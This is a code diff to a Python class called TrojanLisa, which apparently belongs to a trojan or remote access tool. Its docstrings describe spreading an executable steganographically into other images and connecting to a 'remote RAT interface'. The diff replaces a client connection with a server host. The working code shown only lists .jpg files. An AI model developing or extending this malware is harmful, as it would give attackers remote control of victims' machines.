@@ -1,9 +1,9 @@
 import os
-import client
+import server
 
 class TrojanLisa:
     def __init__(self):
-        self.client = client.Client()
+        self.server = server.Server()
 
 
     """ Steganographic executable propagation into other images. """
@@ -23,10 +23,9 @@ class TrojanLisa:
                 if filepath.endswith(".jpg"):
                     print(filepath)
 
-    """ Establish a connection to remote RAT interface. """
-    def connect_to_server(self):
-        self.client.connect()
+    def establish_server(self):
+        self.server.host()
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    trojan_lisa.connect_to_server()
+    trojan_lisa.establish_server()
